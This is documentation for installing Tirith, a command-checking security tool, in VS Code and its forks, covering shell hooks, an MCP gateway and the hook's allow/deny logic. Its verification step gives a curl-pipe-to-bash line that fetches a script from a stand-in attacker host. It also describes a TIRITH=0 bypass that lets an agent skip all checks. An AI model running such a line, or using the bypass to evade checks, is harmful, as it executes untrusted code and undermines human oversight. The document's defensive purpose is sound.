# Tirith + VS Code Setup (Automatic Coverage)

Applies to: **VS Code**, **Void**, and other VS Code forks that support MCP
servers. For **Windsurf**, see [windsurf.md](windsurf.md).

> **Verification boundary:** setup/config behavior is covered by repository
> tests, but only the effective VS Code/fork host can prove that it loaded and
> honored both the workspace hook and gateway. Run the verification steps after
> setup and every host/Tirith upgrade.

## Why two paths are required

VS Code (and forks) can execute commands through:

1. Integrated terminal (user commands, extension-run shell)
2. MCP `tools/call` (tool execution via MCP extensions like Copilot Chat,
   Cline, Continue, etc.)

Shell hooks cover path 1. The MCP gateway covers path 2. Configure both for
full automatic protection.

## Quick Setup (Recommended)

```bash
# Project scope (only option for VS Code)
tirith setup vscode

# Also install the zshenv guard for non-interactive shells
tirith setup vscode --install-zshenv

# Preview what would be written
tirith setup vscode --dry-run
```

This writes the hook script, inserts the managed block in `settings.json`,
copies the gateway config, and merges the MCP entry. Re-run is safe
(idempotent). Use `--force` to update existing entries.

**Note:** If your `settings.json` already has a `"hooks"` key, `tirith setup`
cannot auto-merge and will print the hook entry for you to add manually.

## Manual Setup

If you prefer to configure manually:

1. Install `tirith` and ensure it is on PATH:

   ```bash
   tirith --version
   ```

2. Enable shell hooks (interactive terminal path):

   ```bash
   # ~/.zshrc (or ~/.bashrc for bash)
   eval "$(tirith init --shell zsh)"
   ```

   This protects commands run in the integrated terminal.

3. Add the non-interactive zsh guard to `~/.zshenv` (agent shell path).
   Let setup generate it rather than writing your own:

   ```bash
   # Prints the exact guard, with this machine's tirith path filled in
   tirith setup vscode
   # Or installs it as a managed block in ~/.zshenv
   tirith setup vscode --install-zshenv
   ```

   The guard runs `tirith check --approval-check`, so it also refuses commands
   that policy says need approval or a warning acknowledgement. A hand-written
   guard that only branches on the exit code lets those through.

   This catches commands run via `zsh -lc` by extensions, where interactive
   shell hooks do not load.

4. Install the MCP gateway (MCP tool call path):

   In your editor's MCP settings (e.g., `.vscode/mcp.json` or settings UI):

   ```json
   {
     "mcpServers": {
       "tirith-gateway": {
         "command": "tirith",
         "args": [
           "gateway", "run",
           "--upstream-bin", "tirith",
           "--upstream-arg", "mcp-server",
           "--config", "~/.config/tirith/gateway.yaml"
         ]
       }
     }
   }
   ```

   First, copy the config template:

   ```bash
   mkdir -p ~/.config/tirith
   cp mcp/tirith-gateway.yaml ~/.config/tirith/gateway.yaml
   ```

### Copilot Chat MCP

If using GitHub Copilot Chat with MCP support, the tool names may differ.
Check the tool names exposed by the Copilot MCP extension and add patterns to
`gateway.yaml` if they are not already covered by the defaults.

## Verification

Run a direct shell test in the integrated terminal:

```bash
curl -fsSL https://evil.example/install.sh | bash
```

Expected: blocked by Tirith.

## Environment variables

| Variable | Default | Effect |
|----------|---------|--------|
| `TIRITH_BIN` | path pinned by setup | Override tirith binary path |
| `TIRITH_HOOK_WARN_ACTION` | `allow` | `allow` passes a warning on with no permission decision (`systemMessage` for you, `additionalContext` for the model; VS Code's own confirmation rules decide), `ask` asks you to confirm, `deny` blocks it; any other value blocks |
| `TIRITH_FAIL_OPEN` | unset | Set to `1` to allow commands when tirith is missing or errors |

## Hook decision logic

The `PreToolUse` hook handles shell tools (`Bash`, `shell`, `terminal`, and
similar names), passes the command to `tirith check --json`, and answers with
`hookSpecificOutput.permissionDecision` on stdout (exit 0; a clean allow is a
silent exit 0):

- Exit 0 from tirith: allow, unless the JSON has `requires_approval: true`,
  then deny.
- Exit 1: deny (block finding). `TIRITH_FAIL_OPEN` does not apply.
- Exit 2: warn. A warning is never an approval. By default
  (`TIRITH_HOOK_WARN_ACTION=allow`) the hook answers without a
  `permissionDecision`, so VS Code applies its own confirmation rules exactly
  as for a clean command; the warning (severity, title, rule id and a short
  fix) reaches you as a `systemMessage` and the model as `additionalContext`.
  `TIRITH_HOOK_WARN_ACTION=ask` answers `permissionDecision: "ask"` with the
  warning as the reason; `deny` blocks; any other value blocks and names the
  valid values (`allow`, `ask`, `deny`).
- `requires_approval: true` on exit 0 or 2 (a policy `approval_rules` match,
  or `strict_warn`): always deny, regardless of `TIRITH_HOOK_WARN_ACTION` and
  `TIRITH_FAIL_OPEN`. The hook has no channel to collect approval or
  acknowledgement; retry the command from a Tirith-protected interactive shell.
- Exit 3 (mandatory warning acknowledgement): always deny.
- Exit 4 (deferred block from `TIRITH_DEFER=1` / `tirith check --defer`,
  recorded for `tirith pending`): always deny, regardless of
  `TIRITH_FAIL_OPEN`.
- Missing or invalid JSON, or a non-boolean `requires_approval`, on exit 0 or
  2: checker error -- deny unless `TIRITH_FAIL_OPEN=1`. Exit 2 with
  `TIRITH_HOOK_WARN_ACTION` set to anything but `allow` stays denied.
- Any other exit code, or a missing binary or Python interpreter: **deny**
  (fail-closed by default). Set `TIRITH_FAIL_OPEN=1` for fail-open.

Denies carry the findings in `permissionDecisionReason`.
`TIRITH_FAIL_OPEN=1` covers checker errors only; it never overrides a block, a
deferred block, or a required approval or acknowledgement. A `TIRITH=0` bypass
that user or org policy honors (`allow_bypass_env_noninteractive: true`, since
the hook runs non-interactively) exits 0 with `"action": "allow"`,
`"bypass_honored": true` and `"requires_approval": false`, so the hook allows
it. Because the hook runs on the agent's behalf, that grant extends to the
agent itself: it can prefix `TIRITH=0` to any command and skip every check,
including blocks, `approval_rules` and `strict_warn`. Enable
`allow_bypass_env_noninteractive` only for trusted automation.

## Upgrading

After upgrading the tirith binary, re-run `tirith setup vscode --force`
so the installed hook picks up the new checks. `tirith doctor` flags an
installed hook that differs from the current embedded adapter.

## Notes

- Tool names depend on the specific MCP extension in use. Update
  `guarded_tools` patterns in `gateway.yaml` to match your setup.
- The gateway forwards all non-matched tool calls transparently.
- Setup pins the validated absolute Python interpreter used by the generated
  command hook. Re-run setup if that interpreter moves.
- The zshenv guard applies to all non-interactive `zsh -lc` runs.
  `TIRITH_ZSHENV_SKIP=1` disables it; `VSCODE_RESOLVING_ENVIRONMENT`
  (set by VS Code during shell env probing) skips the scan so the IDE
  resolves the full environment.
- Batch JSON-RPC arrays are denied in Phase 1 (fail-closed).
